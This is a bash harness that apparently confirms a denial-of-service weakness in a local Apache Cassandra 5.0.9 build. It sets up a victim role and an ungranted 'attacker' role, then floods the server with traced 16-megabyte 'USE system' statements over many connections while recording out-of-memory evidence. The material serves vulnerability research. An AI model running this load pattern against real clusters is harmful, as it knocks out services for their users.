#!/usr/bin/env bash
# B28 stage 3-b confirm run driver (2026-11-24, ms0625), from the case's stage-2 run.sh and R13's 3-b run3b.sh.
# Usage: run3b.sh <run-id> <mode> <N> <hold-s> <ips>
#   mode SH : shakedown + claim probes (no victim): pre-auth / login probes with TracingStage CompletedTasks deltas, traces
#   mode L  : attack as LOGIN role "attacker" with NO grant: N connections from <ips> source address(es), traced (0x02)
#             unprepared 16,000,000-byte `USE system /*a...a*/`, closed loop, hold <hold-s>; victim role on its own table
# Layout: $W/cassandra (cp -a /mydata/s4/cassandra-base; shipped conf/ untouched), $W/conf-auth (shipped conf/ with
# authenticator: PasswordAuthenticator, authorizer: CassandraAuthorizer), $W/harness, $W/runs/<run-id>.
# Heap 2 GiB (V7, as the verified T2 arm), direct auto, no container limit, swap 0 for the daemon.
set -u
W=/mydata/s4/3b-B28; H=$W/harness; T=$W/cassandra; CONF=$W/conf-auth; HEAP=2G
RID=$1; MODE=$2; N=$3; HOLD=$4; IPS=$5
R=$W/runs/$RID; STOP=$R/STOP; VSTOP=$R/VSTOP
VPW=victim-pw-3b; APW=attacker-pw-3b
mkdir -p $R; exec >> $R/driver.txt 2>&1
log(){ echo "$(date +%FT%T.%3N%z) $*"; }
ems(){ date +%s%3N; }
dpid(){ pgrep -f "^[^ ]*java .*org[.]apache[.]cassandra[.]service[.]CassandraDaemon" | head -1; }
CQ(){ timeout 60 $T/bin/cqlsh 127.0.0.1 9042 "$@"; }
TP="org.apache.cassandra.metrics:type=ThreadPools,path=internal,scope=TracingStage"
ctasks(){ local v; v=$(java -cp $H Jmx 7199 get "$TP,name=CompletedTasks" Value | cut -d'|' -f3); v=${v//[^0-9]/}; echo ${v:-0}; }
log "run $RID mode=$MODE N=$N hold=$HOLD ips=$IPS heap=$HEAP"
[ -n "$(dpid)" ] && { log "ABORT: a CassandraDaemon runs"; exit 1; }
for p in 7000 7199 9042; do ss -ltn | grep -q ":$p " && { log "ABORT: port $p busy"; exit 1; }; done
free=$(df -BG --output=avail /mydata | tail -1 | tr -dc 0-9)
[ "$free" -ge 12 ] || { log "ABORT: /mydata free ${free}G < 12G"; exit 1; }
log "free ${free}G"
md5sum $T/conf/cassandra.yaml $CONF/cassandra.yaml $CONF/jvm11-server.options $CONF/cassandra-env.sh $CONF/jvm-server.options $T/build/apache-cassandra-5.0.9-SNAPSHOT.jar > $R/conf-md5.txt
diff $T/conf/cassandra.yaml $CONF/cassandra.yaml > $R/conf-diff.txt
rm -rf $T/data $T/logs
( ulimit -n 100000; cd $T; exec env CASSANDRA_CONF=$CONF MAX_HEAP_SIZE=$HEAP CASSANDRA_HEAPDUMP_DIR=$R setsid nohup systemd-run --user --scope -p MemorySwapMax=0 \
    --unit=3b-b28-$RID -- bin/cassandra -f > $R/stdout.txt 2>&1 < /dev/null ) &
PID=
for i in $(seq 1 150); do
  sleep 2
  [ -z "$PID" ] && PID=$(dpid)
  grep -q "Starting listening for CQL clients" $R/stdout.txt 2>/dev/null && break
  if [ -n "$PID" ] && ! kill -0 $PID 2>/dev/null; then log "INVALID: daemon died during start"; exit 1; fi
done
[ -z "$PID" ] && PID=$(dpid)
grep -q "Starting listening for CQL clients" $R/stdout.txt || { log "INVALID: no CQL in 300 s"; [ -n "$PID" ] && kill -9 $PID; exit 1; }
log "daemon pid $PID up"
echo $PID > $R/pid
jcmd $PID VM.flags > $R/vm-flags.txt 2>&1
jcmd $PID VM.command_line > $R/vm-cmdline.txt 2>&1
grep -o -E "MaxDirectMemorySize=[0-9A-Za-z]+|MaxHeapSize=[0-9]+|wait_for_tracing_events_timeout_secs=[0-9]+" $R/vm-flags.txt $R/vm-cmdline.txt | sort -u >> $R/resolved.txt
java -cp $H Jmx 7199 get org.apache.cassandra.db:type=StorageService NativeTransportMaxConcurrentRequestsInBytes \
  org.apache.cassandra.db:type=StorageService NativeTransportMaxConcurrentRequestsInBytesPerIp >> $R/resolved.txt 2>&1
grep -o -E "authenticator=[^;]*;|authorizer=[^;]*;|role_manager=[^;]*;|network_authorizer=[^;]*;|native_transport_max_frame_size=[^;]*;|native_transport_max_threads=[^;]*;|max_mutation_size=[^;]*;|memtable_heap_space=[^;]*;|[^_]write_request_timeout=[^;]*;|commitlog_segment_size=[^;]*;|native_transport_rate_limiting_enabled=[^;]*;|native_transport_max_request_data_in_flight[a-z_]*=[^;]*;|native_transport_max_concurrent_connections[a-z_]*=[^;]*;|trace_type_query_ttl=[^;]*;" $T/logs/system.log | sort -u >> $R/resolved.txt
for i in $(seq 1 45); do CQ -u cassandra -p cassandra -e "LIST ROLES" > /dev/null 2>&1 && break; sleep 2; done
{
  echo "== superuser statements (cqlsh as cassandra)"
  S="CREATE ROLE victim WITH PASSWORD = '$VPW' AND LOGIN = true;
CREATE KEYSPACE victim WITH replication = {'class':'SimpleStrategy','replication_factor':1};
CREATE TABLE victim.kv (k int PRIMARY KEY, v text);
GRANT SELECT ON TABLE victim.kv TO victim;
GRANT MODIFY ON TABLE victim.kv TO victim;
CREATE ROLE attacker WITH PASSWORD = '$APW' AND LOGIN = true;"
  [ "$MODE" = SH ] && S="$S
CREATE KEYSPACE b28 WITH replication = {'class':'SimpleStrategy','replication_factor':1};"
  echo "$S"
  CQ -u cassandra -p cassandra -e "$S" && echo "== setup OK"
  echo "== LIST ROLES"; CQ -u cassandra -p cassandra -e "LIST ROLES"
  echo "== LIST ALL PERMISSIONS OF victim"; CQ -u cassandra -p cassandra -e "LIST ALL PERMISSIONS OF victim"
  echo "== LIST ALL PERMISSIONS OF attacker"; CQ -u cassandra -p cassandra -e "LIST ALL PERMISSIONS OF attacker"
  echo "== attacker negative checks (expect Unauthorized)"
  CQ -u attacker -p $APW -e "SELECT * FROM victim.kv LIMIT 1" 2>&1 | tail -2
  CQ -u attacker -p $APW -e "CREATE KEYSPACE atk WITH replication = {'class':'SimpleStrategy','replication_factor':1}" 2>&1 | tail -2
  echo "== keyspaces"; CQ -u cassandra -p cassandra -e "DESCRIBE KEYSPACES"
  echo "== unauthenticated cqlsh (expect AuthenticationFailed)"; CQ -e "SELECT now() FROM system.local" 2>&1 | tail -1
} > $R/auth-setup.txt 2>&1
grep -q "== setup OK" $R/auth-setup.txt || { log "INVALID: auth setup failed"; kill $PID; exit 1; }
log "auth setup done"
CL="python3 -I $H/client3b.py"
if [ "$MODE" = SH ]; then
  # Each probe: one request on a fresh connection; TracingStage CompletedTasks before / 4 s after.
  probe(){ local tag=$1; shift; local b a; b=$(ctasks); local o; o=$($CL --probe "$@" 2>&1 | tail -1); sleep 4; a=$(ctasks)
           log "PROBE $tag | $o | TracingStage CompletedTasks $b -> $a (+$(( a - b )))"; }
  AT="--auth login:attacker:$APW"
  probe P1-nostartup  --auth preauth --nostartup --flags 2 --len 1000000
  probe P2-preauth-1M  --auth preauth --flags 2 --len 1000000
  probe P2b-preauth-16M --auth preauth --flags 2 --len 16000000
  probe P3-login-untraced-1M $AT --flags 0 --len 1000000
  probe P4-login-traced-1M  $AT --flags 2 --len 1000000
  probe P5-login-traced-16M $AT --flags 2 --len 16000000
  probe P5b-login-traced-16M $AT --flags 2 --len 16000000
  probe P6-useb28-nogrant-1M $AT --flags 2 --len 1000000 --head "USE b28"
  probe P7-use-missing-ks-1M $AT --flags 2 --len 1000000 --head "USE nosuchks"
  probe P8-parse-error-1M $AT --flags 2 --len 1000000 --tail " xyz"
  probe P9-select-unauth-1M $AT --flags 2 --len 1000000 --head "SELECT * FROM victim.kv"
  probe P10-use-missing-ks-16M $AT --flags 2 --len 16000000 --head "USE nosuchks"
  probe P11-parse-error-16M $AT --flags 2 --len 16000000 --tail " xyz"
  java -cp $H Jmx 7199 get "org.apache.cassandra.metrics:type=Client,name=AuthSuccess" Count "org.apache.cassandra.metrics:type=Client,name=AuthFailure" Count "org.apache.cassandra.metrics:type=Client,name=ProtocolException" Count "org.apache.cassandra.metrics:type=DroppedMessage,scope=_TRACE,name=Dropped" Count >> $R/probe-jmx.txt 2>&1
  $CL --traces --auth login:cassandra:cassandra --out $R > $R/traces-superuser.txt 2>&1
  $CL --traces $AT --out $R > $R/traces-attacker.txt 2>&1
  CQ -u cassandra -p cassandra -e "SELECT session_id, client, coordinator, command, request, duration FROM system_traces.sessions" > $R/sessions-cqlsh.txt 2>&1
  CP=""
  END=sh
else
  setsid nohup bash $H/monitor.sh $PID $R $STOP < /dev/null > $R/monitor.err 2>&1 &
  setsid nohup python3 -I $H/victim.py --user victim --pw $VPW --rate 10 --out $R/victim.txt --stop $VSTOP --src 127.0.0.1 < /dev/null > $R/victim.err 2>&1 &
  VP=$!
  sleep 30
  log "baseline done; attack start N=$N ips=$IPS at_ms $(ems)"
  log "load start N=$N hold ${HOLD}s"
  $CL --auth login:attacker:$APW --ips $IPS --n $N --hold-s $HOLD --flags 2 --head "USE system" --out $R --tag p0 > $R/client-p0.err 2>&1 &
  CP=$!
fi
alive(){ for c in $CP; do kill -0 $c 2>/dev/null && return 0; done; return 1; }
OOMSEEN=""
while alive && kill -0 $PID 2>/dev/null; do
  sleep 1
  if [ -z "$OOMSEEN" ] && grep -qF "java.lang.OutOfMemoryError" $R/stdout.txt; then OOMSEEN=1; log "OOM line seen in stdout"; fi
  f=$(df -BM --output=avail /mydata | tail -1 | tr -dc 0-9)
  if [ "$f" -lt 6144 ]; then log "DISK GUARD (${f}M): stopping client"; for c in $CP; do kill $c; done; fi
done
if [ "$MODE" = L ]; then
  if kill -0 $PID 2>/dev/null; then
    log "attack client ended; daemon alive (hold end) at_ms $(ems)"
    END="hold"
    log "victim after-phase (30 s, node alive)"; sleep 30
  else
    log "daemon gone while attack running at_ms $(ems)"
    END=daemon-exit
    sleep 3; for c in $CP; do kill $c 2>/dev/null; done
    log "victim after-phase (30 s, node down)"; sleep 30
  fi
  touch $VSTOP
fi
[ -z "$OOMSEEN" ] && grep -qF "java.lang.OutOfMemoryError" $R/stdout.txt && log "OOM line seen in stdout (after loop)"
if grep -q "Dumping heap to" $R/stdout.txt && ! grep -q "Heap dump file created" $R/stdout.txt; then
  for i in $(seq 1 600); do grep -q "Heap dump file created" $R/stdout.txt && break; kill -0 $PID 2>/dev/null || break; sleep 1; done
fi
if kill -0 $PID 2>/dev/null; then
  jcmd $PID Thread.print > $R/threads-at-end.txt 2>&1
  kill $PID
  for i in $(seq 1 60); do kill -0 $PID 2>/dev/null || break; sleep 1; done
  kill -0 $PID 2>/dev/null && { log "kill -9"; kill -9 $PID; }
fi
log "daemon stopped"
for c in $CP; do wait $c 2>/dev/null; done
touch $STOP $VSTOP
sleep 3
[ -n "${VP:-}" ] && kill $VP 2>/dev/null
for i in $(seq 1 30); do systemctl --user is-active 3b-b28-$RID.scope >/dev/null 2>&1 || break; sleep 1; done
grep -qF "java.lang.OutOfMemoryError" $R/stdout.txt && END="$END oom:$(grep -m1 -F "java.lang.OutOfMemoryError" $R/stdout.txt | head -c 160)"
log "END $END"
cp $T/logs/system.log* $T/logs/gc.log* $R/ 2>/dev/null
du -sm $T/data/commitlog $T/data/hints $T/data/data/system_traces > $R/du-end.txt 2>&1
sleep 4
if [ "$MODE" = L ]; then
  python3 -I $H/summarize.py $R > $R/summary.txt 2>&1
  python3 -I $H/victim_summary.py $R > $R/victim-summary.txt 2>&1
  for d in $R/*.hprof; do
    [ -e "$d" ] || continue
    log "dump $d $(stat -c %s $d) B sha256 $(sha256sum $d | cut -c1-16)"
    python3 -I $H/hprof_oome_thread.py $d 22 > $R/oome-thread.txt 2>&1
    python3 -I $H/owners.py $d > $R/owners.txt 2>&1
    rm -f $d; log "dump analysed and deleted"
  done
fi
log "done"
